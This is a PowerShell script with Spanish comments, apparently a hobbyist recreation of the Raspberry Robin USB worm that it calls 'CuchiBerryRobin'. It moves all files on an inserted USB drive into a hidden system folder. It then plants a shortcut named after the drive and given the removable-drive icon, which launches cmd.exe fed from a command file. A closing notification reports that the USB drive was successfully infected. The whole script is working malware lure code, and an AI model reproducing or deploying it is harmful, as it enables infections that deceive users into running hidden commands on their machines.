Add-Content -Path $PSScriptRoot\output.txt -Value "$(Get-Date) - USB Flash Drive was inserted.";
#consige la unidad 
Get-WmiObject Win32_Volume | Where-Object { $_.DriveType -eq 2 } | ForEach-Object {
    $driveLetter = $_.DriveLetter
    $label = $_.Label
    Write-Host "La memoria USB con etiqueta '$label' está asignada a la unidad $driveLetter."
}
Add-Content -Path $PSScriptRoot\output.txt -Value "$(Get-Date) - USB Flash Drive nombre $label es unidad $driveLetter .";

# Set the path to the folder you want to work with
$folderPath = "$driveLetter"

# Create a subfolder
$subfolderPath = Join-Path -Path $folderPath -ChildPath "$label"
New-Item -ItemType Directory -Path $subfolderPath

# Copy all files to the subfolder
Get-ChildItem -Path $folderPath  | Move-Item -Destination $subfolderPath

# Make the subfolder invisible
$attrib = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
(Get-Item $subfolderPath).Attributes = $attrib

#CREANDO LNK
# Set the path to the file you want to create a shortcut for
$targetPath = "cmd.exe"
# Set the path to the file containing the command arguments
$argFilePath = "C:\Users\test\Desktop\img.img"

# Set the path to where you want to create the shortcut
$shortcutPath = "$driveLetter\$label.lnk"

# Set the character set to use for the random string
$charSet = "CUCHIBERRYROBIN"

# Generate a random string of length 100 using the character set
$description = -join ((Get-Random -Count 100 -InputObject $charSet.ToCharArray()))

# Create a WScript.Shell object
$shell = New-Object -ComObject WScript.Shell

# Create the shortcut
$shortcut = $shell.CreateShortcut($shortcutPath)

# Set the shortcut properties
$shortcut.TargetPath = $targetPath
$shortcut.TargetPath = "cmd <C:\Users\test\Desktop\img.img" 
$shortcut.WindowStyle = 1
$shortcut.Description = $description
# Set the icon to the removable drive icon
$iconLocation = "%SystemRoot%\System32\imageres.dll,27"
$shortcut.IconLocation = $iconLocation
# Set the arguments to run the command from the arg file
$shortcut.Arguments = "/c @`"" + $argFilePath + "`""
#$shortcut.Arguments = "CMd < '$argFilePath'"
$shortcut.Arguments = ""

# Save the shortcut
$shortcut.Save()


$Title = "CuchiBerryRObin"
$Message = "USB puteado con exito"
$Type = "info" 
  
[reflection.assembly]::loadwithpartialname("System.Windows.Forms") | out-null
$path = Get-Process -id $pid | Select-Object -ExpandProperty Path
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
$notify = new-object system.windows.forms.notifyicon
$notify.icon = $icon
$notify.visible = $true
$notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)

